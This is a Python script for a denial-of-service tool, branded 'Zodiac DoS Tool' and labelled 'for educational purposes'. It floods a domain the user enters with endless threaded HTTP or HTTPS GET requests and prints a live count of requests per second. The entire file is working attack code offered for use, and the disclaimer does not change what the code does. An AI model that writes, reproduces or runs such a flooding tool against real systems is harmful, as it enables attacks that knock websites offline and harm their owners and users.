########################################
#### Software Developed By opskx902 ####
#### Made for Educational Purposes  ####
########################################

import ssl
import socket
import threading
import time
import os

CONTEXT = ssl.create_default_context()
REQUESTS, RPS = 0, 0
BANNER = """
\033[31moooooooooooo                 .o8   o8o
     d'""""""d888'                "888   `"'
      .888P    .ooooo.   .oooo888  oooo   .oooo.    .ooooo.
     d888'    d88' `88b d88' `888  `888  `P  )88b  d88' `"Y8
   .888P      888   888 888   888   888   .oP"888  888
  d888'    .P 888   888 888   888   888  d8(  888  888   .o8
.8888888888P  `Y8bod8P' `Y8bod88P" o888o `Y888""8o `Y8bod8P'

oooooooooo.              .oooooo..o      ooooooooooooo                     oooo
`888'   `Y8b            d8P'    `Y8      8'   888   `8                     `888
 888      888  .ooooo.  Y88bo.                888       .ooooo.   .ooooo.   888
 888      888 d88' `88b  `"Y8888o.            888      d88' `88b d88' `88b  888
 888      888 888   888      `"Y88b           888      888   888 888   888  888
 888     d88' 888   888 oo     .d8P           888      888   888 888   888  888
o888bood8P'   `Y8bod8P' 8""88888P'           o888o     `Y8bod8P' `Y8bod8P' o888o
\033[0m"""

def clear(): 
  os.system('cls' if os.name == 'nt' else 'clear')

def show_stats():
  global REQUESTS, RPS
  while True:
    time.sleep(1)
    print(f"\033[32m[Requests: {str(REQUESTS)}] - [RPS: {str(RPS)}]\033[0m")
    RPS = 0

def make_ssl_request(url: str):
  global REQUESTS, RPS
  REQUEST = f"GET / HTTP/1.1\r\nHost: {url}\r\nUser-Agent: ZodiacAttacker/6.6.6\r\nConnection: keep-alive\r\n\r\n"
  try:
    with socket.create_connection((url, 443)) as sock:
      with CONTEXT.wrap_socket(sock, server_hostname=url) as ssock:
        ssock.write(bytes(REQUEST, "utf8"))
        REQUESTS += 1
        RPS += 1
  except:
   time.sleep(1)

def start_stats():
  clear()
  thread = threading.Thread(target=show_stats)
  thread.start()

def make_http_request(url: str):
  global REQUESTS, RPS
  REQUEST = f"GET / HTTP/1.1\r\nHost: {url}\r\nUser-Agent: ZodiacAttacker/6.6.6\r\nConnection: keep-alive\r\n\r\n"
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
      sock.connect((url, 80))
      sock.sendall(bytes(REQUEST, "utf8"))
      REQUESTS += 1
      RPS += 1
  except:
    time.sleep(1)

def https_loop(url: str):
  while True:
    try:
      thread = threading.Thread(target=make_ssl_request, args=[url])
      thread.start()
    except:
      time.sleep(1)

def http_loop(url: str):
  while True:
    try:
      thread = threading.Thread(target=make_http_request, args=[url])
      thread.start()
    except:
      time.sleep(1)

def main():
  clear()
  print(BANNER)
  https = input("\033[33m[+] Use HTTPS: \033[0m")
  domain = input("\033[33m[+] Domain: \033[0m")
  if https == "True":
    start_stats()
    https_loop(domain)
  elif https == "False":
    start_stats()
    http_loop(domain)
  else:
    print("\033[31m[-] Available Options for HTTPS: True, False\033[0m")
    print("\033[31m[-] Exiting..\033[0m")
    exit(0)

if __name__ == "__main__":
  main()
